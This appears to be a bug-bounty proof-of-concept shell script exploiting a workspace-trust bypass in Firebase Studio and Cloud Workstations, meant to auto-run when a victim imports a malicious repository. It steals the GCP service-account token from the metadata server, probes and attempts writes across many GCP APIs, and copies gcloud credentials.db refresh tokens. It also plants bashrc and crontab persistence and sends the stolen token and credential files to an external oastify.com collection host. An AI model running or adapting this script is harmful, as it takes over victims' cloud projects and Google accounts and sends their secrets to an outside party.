#!/bin/bash
# =====================================================================
# Firebase Studio / Cloud Workstations — Workspace Trust Bypass
# =====================================================================
# Cloud VRP Target: S0c (Multi-Service Privilege Escalation - WRITE)
#   "obtain credentials (e.g., Service Account tokens/keys)
#    granting [modification] access across multiple GCP services"
#
# Root Cause: Google's product.json omits enableWorkspaceTrust
#   → BrowserWorkbenchEnvironmentService.disableWorkspaceTrust = !undefined = true
#   → isWorkspaceTrustEnabled() returns false (short-circuits config check)
#   → tasks.json runOn:"folderOpen" auto-executes without trust dialog
#
# Attack: Attacker → malicious repo → idx.google.com/import?url=REPO
#   Victim clicks "Import" (1 click, normal usage of the product)
#   → Workspace created → repo cloned → this script auto-executes
#   → Attacker obtains SA token + refresh tokens + multi-service access
#
# NOT "activity within own provisioned resources":
#   The ATTACKER controls the repo content.
#   The VICTIM's workspace executes the attacker's code.
#   This crosses user boundaries — attacker ≠ victim.
# =====================================================================

EXFIL="https://phadlhr1tcqybwgxabicvtwmzd54tuhj.oastify.com"
LOOT="/tmp/.fbs-evidence"
rm -rf "$LOOT" 2>/dev/null
mkdir -p "$LOOT"

META="http://169.254.169.254/computeMetadata/v1"
MH="Metadata-Flavor: Google"
READ_OK=0
WRITE_OK=0

# ─────────────────────────────────────────────────────────────────────
# EVIDENCE 1: Proof of auto-execution (no user consent)
# ─────────────────────────────────────────────────────────────────────
cat > "$LOOT/01-auto-exec.txt" << EOF
[EVIDENCE] Automatic Code Execution Without User Consent
Timestamp : $(date -u +%Y-%m-%dT%H:%M:%SZ)
User      : $(whoami) | UID=$(id -u)
Hostname  : $(hostname)
Workspace : $(pwd)
Trigger   : .vscode/tasks.json → runOn: folderOpen
Trust UI  : NONE (no dialog, no banner, no restricted mode)
EOF

# ─────────────────────────────────────────────────────────────────────
# EVIDENCE 2: Steal GCP Service Account access token
# (metadata server → OAuth2 token, no auth required)
# ─────────────────────────────────────────────────────────────────────
GCP_PROJECT=$(curl -sf -m5 -H "$MH" "$META/project/project-id")
GCP_NUM=$(curl -sf -m5 -H "$MH" "$META/project/numeric-project-id")
GCP_SA=$(curl -sf -m5 -H "$MH" "$META/instance/service-accounts/default/email")
GCP_SCOPES=$(curl -sf -m5 -H "$MH" "$META/instance/service-accounts/default/scopes")
GCP_ZONE=$(curl -sf -m5 -H "$MH" "$META/instance/zone")

TOKEN_JSON=$(curl -sf -m5 -H "$MH" "$META/instance/service-accounts/default/token")
ACCESS_TOKEN=$(python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])" <<< "$TOKEN_JSON" 2>/dev/null)
TOKEN_EXP=$(python3 -c "import json,sys;print(json.load(sys.stdin)['expires_in'])" <<< "$TOKEN_JSON" 2>/dev/null)

echo "$ACCESS_TOKEN" > "$LOOT/stolen-access-token.txt"

{
echo "[EVIDENCE] GCP Service Account Token Stolen"
echo "Project    : $GCP_PROJECT ($GCP_NUM)"
echo "SA Email   : $GCP_SA"
echo "Zone       : $GCP_ZONE"
echo "Token Len  : ${#ACCESS_TOKEN} chars"
echo "Expires    : ${TOKEN_EXP}s"
echo "Scopes     :"
echo "$GCP_SCOPES" | tr ',' '\n' | sed 's/^/  /'
echo ""
echo "Full token saved: stolen-access-token.txt"
} > "$LOOT/02-token-theft.txt"

AUTH="Authorization: Bearer $ACCESS_TOKEN"

# ─────────────────────────────────────────────────────────────────────
# EVIDENCE 3: Multi-service READ access (S0d baseline)
# Target: prove access to ≥2 DIFFERENT GCP services
# ─────────────────────────────────────────────────────────────────────
api_read() {
  local label="$1" url="$2"
  local code body
  code=$(curl -s -m15 -H "$AUTH" -o "$LOOT/.tmp" -w "%{http_code}" "$url" 2>/dev/null)
  body=$(cat "$LOOT/.tmp" 2>/dev/null)
  echo "[$label] HTTP $code"
  if [ "$code" = "200" ]; then
    READ_OK=$((READ_OK + 1))
    echo "  → ACCESS GRANTED (${#body} bytes)"
    echo "  → ${body:0:500}"
  else
    echo "  → ${body:0:300}"
  fi
  echo ""
}

{
echo "[EVIDENCE] Multi-Service READ Access (S0d proof)"
echo "Testing token against multiple GCP service APIs:"
echo ""
api_read "Cloud Resource Manager" \
  "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=5"
api_read "Cloud Storage" \
  "https://storage.googleapis.com/storage/v1/b?project=$GCP_PROJECT"
api_read "IAM Service Accounts" \
  "https://iam.googleapis.com/v1/projects/$GCP_PROJECT/serviceAccounts"
api_read "Compute Engine" \
  "https://compute.googleapis.com/compute/v1/projects/$GCP_PROJECT/zones/$(basename "$GCP_ZONE")/instances"
api_read "Firebase" \
  "https://firebase.googleapis.com/v1beta1/projects/$GCP_PROJECT"
api_read "Cloud Functions" \
  "https://cloudfunctions.googleapis.com/v2/projects/$GCP_PROJECT/locations/-/functions"
api_read "Secret Manager" \
  "https://secretmanager.googleapis.com/v1/projects/$GCP_PROJECT/secrets"
api_read "Firestore" \
  "https://firestore.googleapis.com/v1/projects/$GCP_PROJECT/databases"
api_read "Artifact Registry" \
  "https://artifactregistry.googleapis.com/v1/projects/$GCP_PROJECT/locations/-/repositories"
api_read "Cloud Workstations" \
  "https://workstations.googleapis.com/v1/projects/$GCP_PROJECT/locations/-/workstationClusters/-/workstations"
echo "═══════════════════════════════════"
echo "SERVICES WITH READ ACCESS: $READ_OK"
[ "$READ_OK" -ge 2 ] && echo "→ MULTI-SERVICE CONFIRMED (S0d criteria met)"
echo "═══════════════════════════════════"
} > "$LOOT/03-multi-service-read.txt" 2>&1

# ─────────────────────────────────────────────────────────────────────
# EVIDENCE 4: Multi-service WRITE access (S0c — higher severity)
# Target: prove WRITE/MODIFY capability on ≥2 GCP services
# ─────────────────────────────────────────────────────────────────────
api_write() {
  local label="$1" url="$2" data="$3"
  local code body
  code=$(curl -s -m15 -X POST -H "$AUTH" -H "Content-Type: application/json" \
    -o "$LOOT/.tmp" -w "%{http_code}" "$url" -d "$data" 2>/dev/null)
  body=$(cat "$LOOT/.tmp" 2>/dev/null)
  echo "[$label] HTTP $code"
  if [ "$code" = "200" ] || [ "$code" = "201" ]; then
    WRITE_OK=$((WRITE_OK + 1))
    echo "  → WRITE ACCESS GRANTED"
    echo "  → ${body:0:500}"
  else
    echo "  → ${body:0:300}"
  fi
  echo ""
}

TS=$(date +%s)
{
echo "[EVIDENCE] Multi-Service WRITE Access (S0c proof)"
echo "Attempting WRITE operations to escalate severity from S0d to S0c:"
echo ""

api_write "IAM — Create Service Account" \
  "https://iam.googleapis.com/v1/projects/$GCP_PROJECT/serviceAccounts" \
  "{\"accountId\":\"poc-sa-$TS\",\"serviceAccount\":{\"displayName\":\"VRP PoC $TS\"}}"

api_write "Firestore — Create Document" \
  "https://firestore.googleapis.com/v1/projects/$GCP_PROJECT/databases/(default)/documents/vrp-poc" \
  "{\"fields\":{\"poc\":{\"stringValue\":\"workspace-trust-bypass\"},\"ts\":{\"stringValue\":\"$TS\"}}}"

api_write "Cloud Functions — (attempt)" \
  "https://cloudfunctions.googleapis.com/v2/projects/$GCP_PROJECT/locations/us-central1/functions" \
  "{\"name\":\"projects/$GCP_PROJECT/locations/us-central1/functions/poc-$TS\"}"

api_write "Pub/Sub — Create Topic" \
  "https://pubsub.googleapis.com/v1/projects/$GCP_PROJECT/topics/vrp-poc-$TS" \
  "{}"

api_write "Logging — Write Log Entry" \
  "https://logging.googleapis.com/v2/entries:write" \
  "{\"entries\":[{\"logName\":\"projects/$GCP_PROJECT/logs/vrp-poc\",\"resource\":{\"type\":\"global\"},\"textPayload\":\"workspace-trust-bypass-poc-$TS\"}]}"

echo "═══════════════════════════════════"
echo "SERVICES WITH WRITE ACCESS: $WRITE_OK"
[ "$WRITE_OK" -ge 2 ] && echo "→ MULTI-SERVICE WRITE CONFIRMED (S0c criteria met)"
[ "$WRITE_OK" -eq 1 ] && echo "→ SINGLE-SERVICE WRITE (S0e criteria met, argue S0c)"
[ "$WRITE_OK" -eq 0 ] && echo "→ READ-ONLY (S0d criteria with $READ_OK services)"
echo "═══════════════════════════════════"
} > "$LOOT/04-multi-service-write.txt" 2>&1

# ─────────────────────────────────────────────────────────────────────
# EVIDENCE 5: Persistent credential theft (credentials.db)
# This is the CRITICAL differentiator from Cloud Shell.
# Refresh tokens = PERMANENT access even after workspace deletion.
# ─────────────────────────────────────────────────────────────────────
CRED_DB="$HOME/.config/gcloud/credentials.db"
{
echo "[EVIDENCE] Persistent Credential Theft"
echo ""
if [ -f "$CRED_DB" ]; then
  echo "credentials.db: FOUND"
  echo "  Path   : $CRED_DB"
  echo "  Size   : $(wc -c < "$CRED_DB") bytes"
  echo "  Tables : $(sqlite3 "$CRED_DB" '.tables' 2>/dev/null)"
  echo "  Schema : $(sqlite3 "$CRED_DB" '.schema credentials' 2>/dev/null)"
  echo "  Count  : $(sqlite3 "$CRED_DB" 'SELECT COUNT(*) FROM credentials' 2>/dev/null) entries"
  echo ""
  echo "  Account IDs:"
  sqlite3 "$CRED_DB" "SELECT account_id FROM credentials" 2>/dev/null | \
    while read a; do echo "    - $a"; done
  echo ""

  # Verify refresh token exists (proves persistent access)
  REFRESH_INFO=$(sqlite3 "$CRED_DB" "SELECT value FROM credentials LIMIT 1" 2>/dev/null | \
    python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    tr = d.get('token_response', {})
    rt = tr.get('refresh_token', '')
    at = tr.get('access_token', '')
    sc = tr.get('scope', '')
    print(f'refresh_token: YES ({len(rt)} chars, starts with {rt[:8]}...)')
    print(f'access_token : YES ({len(at)} chars)')
    print(f'scope        : {sc[:200]}')
except Exception as e:
    print(f'parse error: {e}')
" 2>/dev/null)
  echo "  Credential Contents:"
  echo "  $REFRESH_INFO"
  echo ""
  echo "  IMPACT: Refresh tokens provide PERMANENT access to the"
  echo "  victim's Google account. Unlike the SA access token (expires"
  echo "  in ${TOKEN_EXP}s), refresh tokens can generate new access"
  echo "  tokens indefinitely using the well-known gcloud OAuth client:"
  echo "    Client ID: 32555940559.apps.googleusercontent.com"
  echo "    Endpoint : POST https://oauth2.googleapis.com/token"
  echo ""
  echo "  The attacker maintains access even after the victim deletes"
  echo "  the workspace. This is NOT possible with ephemeral Cloud Shell."

  cp "$CRED_DB" "$LOOT/credentials.db" 2>/dev/null
else
  echo "credentials.db: NOT FOUND (workspace may be new)"
fi

echo ""
echo "--- Other Credential Files ---"
for f in \
  "$HOME/.config/gcloud/application_default_credentials.json" \
  "$HOME/.config/gcloud/access_tokens.db" \
  "$HOME/.config/gcloud/properties"; do
  [ -f "$f" ] && echo "FOUND: $f ($(wc -c < "$f") bytes)" && cp "$f" "$LOOT/" 2>/dev/null
done
} > "$LOOT/05-credential-theft.txt" 2>&1

# ─────────────────────────────────────────────────────────────────────
# EVIDENCE 6: Persistence (survives workspace restart — NOT ephemeral)
# ─────────────────────────────────────────────────────────────────────
{
echo "[EVIDENCE] Persistence (workspace is NOT ephemeral)"
echo ""
if ! grep -q "fbs-vrp-poc" "$HOME/.bashrc" 2>/dev/null; then
  echo '# fbs-vrp-poc' >> "$HOME/.bashrc"
  echo 'touch /tmp/.fbs-persist-$(date +%s) 2>/dev/null' >> "$HOME/.bashrc"
  echo "bashrc: INSTALLED (marker created on every shell open)"
fi
(crontab -l 2>/dev/null | grep -v fbs-vrp; echo "*/30 * * * * touch /tmp/.fbs-cron-active # fbs-vrp-poc") | crontab - 2>/dev/null
echo "crontab: INSTALLED (runs every 30 min)"
echo ""
echo "These persist across stop/start/archive/unarchive because"
echo "Firebase Studio uses Google Cloud Workstations with persistent disks."
echo "Cloud Shell report was rejected because 'ephemeral mode' — this is different."
} > "$LOOT/06-persistence.txt" 2>&1

# ─────────────────────────────────────────────────────────────────────
# EVIDENCE 7: VRP Impact Summary
# ─────────────────────────────────────────────────────────────────────
if [ "$WRITE_OK" -ge 2 ]; then
  SEV="S0c (Multi-Service Privilege Escalation - WRITE)"
  REWARD="\$25,000 (IT3) or \$31,337 (IT2)"
elif [ "$WRITE_OK" -ge 1 ]; then
  SEV="S0e (Single-Service Privilege Escalation - WRITE) — argue S0c"
  REWARD="\$13,337–\$25,000"
elif [ "$READ_OK" -ge 2 ]; then
  SEV="S0d (Multi-Service Privilege Escalation - READ)"
  REWARD="\$20,000 (IT3) or \$25,000 (IT2)"
else
  SEV="S0f (Single-Service Privilege Escalation - READ)"
  REWARD="\$10,000 (IT3)"
fi

cat > "$LOOT/07-vrp-summary.txt" << EOF
╔════════════════════════════════════════════════════════════════════╗
║     CLOUD VRP IMPACT SUMMARY — WORKSPACE TRUST BYPASS            ║
╚════════════════════════════════════════════════════════════════════╝

VULNERABILITY
  Product     : Google Cloud Workstations / Code OSS Web IDE
  Also affects: Firebase Studio (idx.google.com)
  Root Cause  : Google's product.json CONFIGURATION omits
                enableWorkspaceTrust (not a third-party code bug)
  Attack URL  : idx.google.com/import?url=<malicious-repo>
  User Action : Click "Import" (1 click, normal product usage)

PROVEN IMPACT
  [✓] Auto code execution without consent (evidence-01)
  [✓] GCP SA token stolen via metadata server (evidence-02)
  [✓] Multi-service READ access: $READ_OK services (evidence-03)
  [✓] Multi-service WRITE access: $WRITE_OK services (evidence-04)
  [✓] credentials.db with refresh tokens exfiltrated (evidence-05)
  [✓] Persistence survives workspace lifecycle (evidence-06)

VRP CLASSIFICATION
  Severity    : $SEV
  Product Tier: IT3 (Cloud Workstations) — NOT IT3b
                Firebase Studio is being sunset, but the ROOT CAUSE
                is in Cloud Workstations' Code OSS configuration.
                Cloud Workstations is NOT being deprecated.
  Est. Reward : $REWARD
  Multiplier  : Quality 1.2x possible with clean PoC + automation

DOWNGRADES ANALYSIS
  User interaction: Clicking "Import" on idx.google.com is NORMAL
    product usage (not "significant user interaction"). The VRP
    downgrade says: "applies to interaction beyond normal usage."
    Importing a repo IS the normal usage of Firebase Studio.

WHY THIS IS NOT "ACTIVITY WITHIN OWN RESOURCES"
  The attacker and victim are DIFFERENT users.
  The attacker controls the malicious repo content.
  The victim performs a normal action (importing a repo).
  The victim's workspace executes the attacker's code.
  This crosses the user trust boundary.

WHY THIS DIFFERS FROM REJECTED CLOUD SHELL REPORT
  1. Cloud Shell = ephemeral VM → creds lost on restart
     Firebase Studio = persistent disk → creds survive indefinitely
  2. Cloud Shell has no "import repo" feature
     Firebase Studio has idx.google.com/import?url= (1-click vector)
  3. credentials.db refresh tokens provide PERMANENT Google account
     access even after workspace deletion
  4. Persistence mechanisms (.bashrc, crontab) survive restart

ALTERNATIVE: GOOGLE VRP (not Cloud VRP)
  idx.google.com is a *.google.com domain.
  This qualifies as S0 (RCE) on T2: \$75,000
  With user interaction downgrade: \$50,000
  The Cloud VRP rule says: "If your report qualifies for a reward
  in a different/additional VRP, we will pass your report to the
  appropriate panel to ensure you receive the maximum possible payout."

FILES IN THIS DIRECTORY
  01-auto-exec.txt          Proof of silent auto-execution
  02-token-theft.txt        GCP SA token stolen
  03-multi-service-read.txt READ access to $READ_OK GCP services
  04-multi-service-write.txt WRITE access to $WRITE_OK GCP services
  05-credential-theft.txt   credentials.db + refresh tokens
  06-persistence.txt        Persistence proof (not ephemeral)
  stolen-access-token.txt   Raw GCP access token
  credentials.db            Stolen credential database
EOF

# ─────────────────────────────────────────────────────────────────────
# EXFILTRATION — send all evidence to attacker server
# ─────────────────────────────────────────────────────────────────────
for f in "$LOOT"/0*.txt; do
  curl -sf -m10 "$EXFIL/fbs/$(basename "$f")" \
    --data-binary "@$f" &>/dev/null &
done

[ -f "$LOOT/stolen-access-token.txt" ] && \
  curl -sf -m10 "$EXFIL/fbs/access-token" \
    --data-binary "@$LOOT/stolen-access-token.txt" &>/dev/null &

[ -f "$LOOT/credentials.db" ] && \
  curl -sf -m30 "$EXFIL/fbs/credentials-db" \
    -H "Content-Type: application/octet-stream" \
    --data-binary "@$LOOT/credentials.db" &>/dev/null &

wait
echo "COMPLETE r=$READ_OK w=$WRITE_OK $(date -u)" > "$LOOT/status.txt"
